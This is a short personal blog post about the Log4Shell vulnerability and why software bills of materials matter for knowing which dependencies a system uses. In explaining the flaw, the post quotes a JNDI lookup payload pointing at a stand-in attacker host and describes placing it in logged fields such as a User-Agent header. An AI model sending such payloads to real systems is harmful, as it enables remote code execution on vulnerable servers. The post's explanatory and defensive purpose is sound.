---
layout: post
title: "Log4Shell: the scramble from the outside"
date: 2021-12-10
author: marcetux
tags: [security, java, supply-chain, incident]
---
I left the bank three weeks ago so I'm watching Log4Shell from the outside, which
is both a relief and a weird kind of guilt. Three former colleagues texted me within
twelve hours of the CVE dropping asking whether any of our old services used Log4j.
The answer for our .NET stack was no — Log4j is a Java library and the bank's
new services ran on .NET — but the question itself is the painful part: the fact
that you have to *ask* rather than *know* means your dependency graph is opaque
enough that a critical library could be lurking anywhere.

The vulnerability itself is elegant in a terrible way. The Java Naming and Directory
Interface (JNDI) feature in Log4j allows a logged string to trigger a network
lookup and code execution. An attacker sends `${jndi:ldap://attacker.com/a}` in
a field that gets logged — a User-Agent header, a username, anything that flows
into a logger — and if the server is running a vulnerable Log4j version, it fetches
and executes code from the attacker's server. The log statement is the exploit.
The attack surface is any system that logs user input, which is most systems.

The lesson I keep saying out loud: the SolarWinds post I wrote in January still
applies. Software bill of materials — a machine-readable inventory of what your
software is actually built from — is the prerequisite for answering "are we
vulnerable?" in minutes instead of in a 3 a.m. scramble. The tooling for SBOM
generation is improving; the organizational will to require it is still rare.
Log4Shell will not be the last library to detonate in a system nobody knew had it.
